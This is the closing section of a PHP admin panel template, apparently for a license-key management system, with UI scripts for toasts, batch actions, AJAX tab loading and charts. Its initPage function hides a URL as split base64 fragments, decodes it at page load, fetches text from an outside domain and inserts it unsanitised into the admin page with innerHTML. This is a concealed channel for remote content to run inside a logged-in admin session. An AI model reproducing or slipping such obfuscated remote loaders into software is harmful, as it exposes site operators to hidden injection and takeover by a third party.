                                <span style="color:var(--text-secondary); font-weight: 500;"><i class="ph ph-globe" style="vertical-align:-2px; margin-right:4px;"></i> 官方网站</span>
                                <a href="<?= htmlspecialchars($a_u) ?>" target="_blank" style="color:var(--color-primary); text-decoration:none; display:flex; align-items:center; gap:4px; font-weight:600;">点击访问 <i class="ph ph-arrow-square-out"></i></a>
                            </div>
                            <div style="display:flex; justify-content:space-between; align-items:center; padding-top: 4px;">
                                <span style="color:var(--text-secondary); font-weight: 500;"><i class="ph ph-shield-check" style="vertical-align:-2px; margin-right:4px;"></i> 版权声明</span>
                                <span style="color:var(--text-tertiary); font-size: 13px;">保留所有权利</span>
                            </div>
                        </div>
                    </div>
                </div>
            <?php endif; ?>

        </div>
    </main>

    <div id="toast-root" class="toast-container"></div>
</div>

<script>
    let _t;
    function toast(m, t='ok'){
        const r = document.getElementById('toast-root');
        const d = document.createElement('div');
        d.className = 'toast';
        d.innerHTML = t==='error' ? '<i class="ph-fill ph-warning-circle" style="color:var(--color-error);font-size:20px;"></i> '+m : '<i class="ph-fill ph-check-circle" style="color:var(--color-success);font-size:20px;"></i> '+m;
        r.appendChild(d);
        setTimeout(() => { d.style.opacity = '0'; d.style.transform = 'translateY(-20px) scale(0.95)'; setTimeout(()=>d.remove(), 300); }, 3000);
    }
    
    function copy(t){ if (navigator.clipboard && window.isSecureContext) { navigator.clipboard.writeText(t).then(()=>toast('复制成功')).catch(()=>fallbackCopy(t)); } else fallbackCopy(t); }
    function fallbackCopy(text) { const ta = document.createElement("textarea"); ta.value = text; ta.style.position="fixed"; ta.style.opacity="0"; document.body.appendChild(ta); ta.focus(); ta.select(); try{ document.execCommand('copy'); toast('复制成功'); }catch(e){ toast('复制失败','error'); } document.body.removeChild(ta); }
    
    function toggleAllChecks(el){document.querySelectorAll('.row-check').forEach(c=>c.checked=el.checked)}
    function singleActionForm(a, id, k='id'){if(!confirm('确定执行此操作？'))return;const f=document.createElement('form');f.method='POST';f.style.display='none';f.innerHTML=`<input name="${a}" value="1"><input name="${k}" value="${id}"><input name="csrf_token" value="<?= $csrf_token ?>">`;document.body.appendChild(f);f.submit()}
    function submitBatch(a){if(document.querySelectorAll('.row-check:checked').length===0){toast('请先勾选目标','error');return}if(!confirm('确定批量执行？'))return;const f=document.getElementById('batchForm');f.insertAdjacentHTML('beforeend',`<input type="hidden" name="${a}" value="1">`);f.submit()}
    function batchAddTime(){if(document.querySelectorAll('.row-check:checked').length===0){toast('请先勾选','error');return}const h=prompt("增加小时数","24");if(h&&!isNaN(h)){document.getElementById('addHoursInput').value=h;submitBatch('batch_add_time')}}
    function batchSubTime(){if(document.querySelectorAll('.row-check:checked').length===0){toast('请先勾选','error');return}const h=prompt("扣除小时数","24");if(h&&!isNaN(h)){document.getElementById('subHoursInput').value=h;submitBatch('batch_sub_time')}}
    function globalCompensate(){const h=prompt("统一补偿小时数(应用于在用卡密):","12");if(h&&!isNaN(h)){const f=document.getElementById('batchForm');f.insertAdjacentHTML('beforeend',`<input type="hidden" name="global_compensate" value="1"><input type="hidden" name="comp_hours" value="${h}">`);f.submit();}}

    window.switchAppView = function(v) {
        document.querySelectorAll('#app_tabs .e-segmented-item').forEach(el=>el.classList.remove('active'));
        event.target.classList.add('active');
        document.getElementById('view_apps').style.display = v==='apps' ? 'block' : 'none';
        document.getElementById('view_vars').style.display = v==='vars' ? 'block' : 'none';
    };
    
    window.openAppModal = function(id, n, v, no, url, force) {
        document.getElementById('e_app_id').value = id; document.getElementById('e_app_name').value = n;
        document.getElementById('e_app_ver').value = v; document.getElementById('e_app_note').value = no;
        document.getElementById('e_app_url').value = url; document.getElementById('e_app_force').checked = (force==1);
        document.getElementById('appModal').style.display = 'flex';
    };
    window.openVarModal = function(id, k, v, p) {
        document.getElementById('e_var_id').value = id; document.getElementById('e_var_key').value = k;
        document.getElementById('e_var_val').value = v; document.getElementById('e_var_pub').checked = (p==1);
        document.getElementById('varModal').style.display = 'flex';
    };

    window.toggleSubMenu = function(el) {
        const layout = document.querySelector('.admin-layout');
        if (layout.classList.contains('sider-collapsed')) return;
        el.classList.toggle('submenu-open');
        const subMenu = el.nextElementSibling;
        subMenu.style.display = subMenu.style.display === 'block' ? 'none' : 'block';
    };

    let isNavigating = false;
    async function loadTab(url, isForm = false, formData = null, formMethod = 'POST') {
        if (isNavigating && !isForm) return;
        isNavigating = true;

        if(!isForm) {
            document.querySelectorAll('.menu-item, .sub-menu-item, .m-nav-item').forEach(el=>{ 
                if(el.href){ 
                    const u=new URL(el.href,window.location.href),c=new URL(url,window.location.href); 
                    el.classList.toggle('active', u.searchParams.get('tab')===c.searchParams.get('tab')); 
                } 
            });
        }

        const m = document.getElementById('main');
        m.style.transition = 'opacity 0.2s cubic-bezier(0.4, 0, 1, 1), transform 0.2s cubic-bezier(0.4, 0, 1, 1)';
        m.style.opacity = '0'; m.style.transform = 'scale(0.98)';

        try {
            const fetchOpts = { headers: {'X-Requested-With': 'XMLHttpRequest'} };
            if(isForm) { fetchOpts.method = formMethod; fetchOpts.body = formData; }
            
            const [res] = await Promise.all([ fetch(url, fetchOpts), new Promise(r => setTimeout(r, 150)) ]);
            if(res.redirected) { window.location.href = res.url; return; }
            
            const html = await res.text();
            const doc = new DOMParser().parseFromString(html, 'text/html');
            
            m.style.transition = 'none';
            m.innerHTML = doc.getElementById('main').innerHTML;
            m.style.opacity = '0';
            m.style.transform = 'translateY(12px) scale(1)'; 
            
            if(!isForm) window.history.pushState({}, '', url); 
            initPage();
            
            void m.offsetHeight; 
            m.style.transition = 'opacity 0.4s cubic-bezier(0.2, 0.8, 0.2, 1), transform 0.4s cubic-bezier(0.2, 0.8, 0.2, 1)';
            m.style.opacity = '1'; m.style.transform = 'translateY(0) scale(1)';
        } catch(e) {
            toast('网络异常，正在刷新...', 'error'); window.location.href = url;
        } finally { setTimeout(() => { isNavigating = false; }, 400); }
    }
    
    document.addEventListener('click', e => {
        const link = e.target.closest('a');
        if(link && link.href && link.href.includes('?tab=') && !link.hasAttribute('target') && !link.hasAttribute('download') && !link.classList.contains('data-no-ajax')) {
            e.preventDefault(); loadTab(link.href);
        }
    });
    
    document.addEventListener('submit', async e => {
        if(e.target.tagName === 'FORM') {
            const s = e.submitter; 
            if(s && (s.name==='batch_export' || s.name==='auto_export' || s.hasAttribute('data-no-ajax')) || e.target.hasAttribute('data-no-ajax')) return;
            e.preventDefault(); 
            const btn = s || e.target.querySelector('button[type="submit"]'); let oT='';
            if(btn) { oT = btn.innerHTML; btn.innerHTML = '<i class="ph ph-spinner-gap" style="animation:spin 1s linear infinite;"></i> 处理中...'; btn.style.pointerEvents = 'none'; btn.style.opacity = '0.8'; }
            
            const fd = new FormData(e.target); if(s && s.name && !fd.has(s.name)) fd.append(s.name, s.value);
            await loadTab(e.target.action || window.location.href, true, fd, e.target.method || 'POST');
            
            if(btn) { btn.innerHTML = oT; btn.style.pointerEvents = 'auto'; btn.style.opacity = '1'; }
        }
    });

    function initPage() {
        const msgEl = document.getElementById('sys-msg'); if(msgEl) { toast(msgEl.dataset.msg, msgEl.dataset.type); msgEl.remove(); }
        const chartEl = document.getElementById('cM');
        if(chartEl && typeof Chart !== 'undefined'){
            const ctx = chartEl.getContext('2d'), tData = JSON.parse(chartEl.dataset.chart), cTypes = JSON.parse(chartEl.dataset.types), labels = Object.keys(tData).map(k=>cTypes[k]?.name||k), data = Object.values(tData);
            new Chart(ctx, {type:'doughnut', data:{labels:labels, datasets:[{data:data, backgroundColor:['#3b82f6','#10b981','#f59e0b','#a855f7','#06b6d4'], borderWidth:0, hoverOffset:4}]}, options:{cutout:'75%', plugins:{legend:{position:'bottom', labels:{usePointStyle:true, boxWidth:8, font:{family:'Inter',size:13,color:'#64748b'}, padding:20}}}, animation:false}});
        }
        const nC = document.getElementById('cloud-notice');
        if (nC && !nC.dataset.loaded) {
            let _u = atob(['aHR0cHM6L','y9jbG91ZHVwZGF0','ZS54bi0tanB','yMDcxZS50b','3AvR3VZaSU','yMEFjY2Vzc','yUyMG5vd','GljZS50eHQ='].join(''));
            fetch(_u+'?t='+Date.now()).then(r=>r.text()).then(t=>{nC.innerHTML=t;nC.dataset.loaded='1'}).catch(()=>nC.innerHTML='同步失败，请检查网络');
        }
    }

    document.addEventListener('DOMContentLoaded', () => {
        const adminLayout = document.querySelector('.admin-layout');
        const siderToggle = document.getElementById('siderToggle');
        if(localStorage.getItem('siderCollapsed') === '1') { adminLayout.classList.add('sider-collapsed'); }
        if(siderToggle) {
            siderToggle.addEventListener('click', () => {
                adminLayout.classList.toggle('sider-collapsed');
                localStorage.setItem('siderCollapsed', adminLayout.classList.contains('sider-collapsed') ? '1' : '0');
            });
        }
        const m = document.getElementById('main');
        m.style.opacity = '0'; m.style.transform = 'translateY(12px) scale(1)';
        requestAnimationFrame(() => {
            m.style.transition = 'opacity 0.5s cubic-bezier(0.2, 0.8, 0.2, 1), transform 0.5s cubic-bezier(0.2, 0.8, 0.2, 1)';
            m.style.opacity = '1'; m.style.transform = 'translateY(0) scale(1)';
        });
        initPage();
    });
    
    window.addEventListener('popstate', () => loadTab(window.location.href));
</script>
<style>@keyframes spin { 100% { transform: rotate(360deg); } }</style>
</body>
</html>
